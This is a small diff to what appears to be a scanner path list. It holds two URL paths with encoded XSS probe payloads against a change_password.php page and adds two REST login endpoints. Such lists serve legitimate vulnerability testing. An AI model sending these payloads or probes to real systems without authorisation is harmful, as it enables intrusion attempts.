@@ -1,2 +1,4 @@
 /unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
 /php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+/rest/GetUserlogin
+/rest/GetAutologin
